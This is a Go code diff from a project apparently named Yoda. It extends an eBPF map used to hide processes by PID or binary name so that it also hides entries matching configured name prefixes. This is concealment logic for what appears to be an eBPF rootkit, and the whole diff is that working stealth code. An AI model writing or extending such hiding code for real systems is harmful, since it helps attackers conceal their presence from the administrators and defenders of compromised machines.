@@ -10,6 +10,7 @@ import (
 	"strconv"
 	"strings"
 
+	cfg "github.com/cezamee/Yoda/internal/config"
 	"github.com/cilium/ebpf"
 	"github.com/cilium/ebpf/link"
 )
@@ -24,8 +25,9 @@ const (
 )
 
 type HiddenEntry struct {
-	Name    [MaxNameLen]byte
-	NameLen int32
+	Name     [100]byte
+	NameLen  int32
+	IsPrefix uint8
 }
 
 // matchesBinary returns true if the process with pid matches the binary name (exe or cmdline)
@@ -101,16 +103,33 @@ func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) erro
 		if val == -1 && binName != "" {
 			copy(entry.Name[:], binName)
 			entry.NameLen = int32(len(binName))
+			entry.IsPrefix = 0
 		} else if val != -1 {
 			pidStr := strconv.Itoa(val)
 			copy(entry.Name[:], pidStr)
 			entry.NameLen = int32(len(pidStr))
+			entry.IsPrefix = 0
 		} else {
 			continue
 		}
 		key := uint32(idx)
 		if err := hiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
 			return fmt.Errorf("failed to update hidden_entries[%d]: %w", idx, err)
+		}
+		idx++
+	}
+
+	for _, prefix := range cfg.HiddenPrefixes {
+		if idx >= MaxHidden {
+			break
+		}
+		var entry HiddenEntry
+		copy(entry.Name[:], prefix)
+		entry.NameLen = int32(len(prefix))
+		entry.IsPrefix = 1
+		key := uint32(idx)
+		if err := hiddenMap.Update(&key, &entry, ebpf.UpdateAny); err != nil {
+			return fmt.Errorf("failed to update hidden_entries[prefix %s]: %w", prefix, err)
 		}
 		idx++
 	}
